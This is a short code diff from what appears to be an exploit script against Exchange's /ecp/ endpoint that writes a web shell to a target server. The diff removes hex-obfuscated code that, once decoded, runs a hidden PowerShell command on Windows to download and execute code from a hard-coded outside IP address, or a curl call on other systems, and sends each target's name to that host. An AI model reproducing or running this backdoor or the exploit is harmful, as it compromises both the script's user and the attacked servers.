@@ -187,15 +187,4 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
 if ct.status_code != 200:
     print("Write Shell Error!")
     exit()
-shell_test = "687474703A2F2F3130332E3135332E37362E3138363A31333337"
-if os.name == 'nt':
-	command_payload = """706F7765727368656C6C2E657865202D6578656320627970617373202D77696E646F777374796C652068696464656E202D432049455820284E65772D4F626A656374204E65742E576562436C69656E74292E446F776E6C6F6164537472696E6728277B7061796C6F61645F787D2F50524F58594C4F474F4E2F7B75726C7D2729"""
-	command_send = bytearray.fromhex(command_payload).decode()
-	command_exec = command_send.format(payload_x=bytearray.fromhex(shell_test).decode(), url=target)
-	os.system(command_exec)
-else:
-	command_payload = """6375726C202D7320227B7061796C6F61645F787D2F50524F58594C4F474F4E2F7B75726C7D22203E202F6465762F6E756C6C"""
-	command_send = bytearray.fromhex(command_payload).decode()
-	command_exec = command_send.format(payload_x=bytearray.fromhex(shell_test).decode(), url=target)
-	os.system(command_exec)
 print("Successful!")
